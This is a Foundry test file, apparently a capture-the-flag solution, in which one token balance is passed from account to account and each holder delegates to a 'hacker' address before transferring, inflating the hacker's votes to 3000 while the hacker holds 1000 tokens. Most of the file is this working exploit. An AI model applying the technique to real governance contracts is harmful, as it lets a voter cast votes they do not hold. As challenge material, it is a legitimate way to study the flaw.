// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.12;

import "forge-std/Test.sol";
import "../src/VotingMachine.sol";

contract exploitTest is Test {
	VoteToken vToken;
	address public owner = address(0);
	address public hacker =address(1337);

	address public alice= address(1);
	address public bob = address(2);
	address public carl = address(3);

	function setUp() public {
		vm.startPrank(owner);
		vToken = new VoteToken();
		vToken.mint(alice, 1000);
		vm.stopPrank();
  }
	
	function testExploit() public {

        
	uint hacker_vote = vToken.getVotes(hacker);
    console.log("Vote Count of Hacker before attack: %s ", hacker_vote);

    // soluiton
    vm.startPrank(alice);
        
       
        vToken.delegate(hacker);
        
        vToken.transfer(bob, 1000);
        uint bob_balance= vToken.balanceOf(bob);
        assertEq(bob_balance, 1000);

    vm.stopPrank();


    vm.startPrank(bob);
        
        vToken.delegate(hacker);

        vToken.transfer(carl, 1000);
        uint carl_balance= vToken.balanceOf(carl);
        assertEq(carl_balance, 1000);

    vm.stopPrank();


    vm.startPrank(carl);

        vToken.delegate(hacker);

        vToken.transfer(hacker, 1000);

    vm.stopPrank();

	uint hacker_balance= vToken.balanceOf(hacker);
    console.log("Hacker's vToken after the attack: %s: ", hacker_balance);

    hacker_vote = vToken.getVotes(hacker);
    console.log("Vote Count of Hacker after attack: %s ", hacker_vote);

	assertEq(hacker_vote , 3000);
	assertEq(hacker_balance, 1000);
	}
}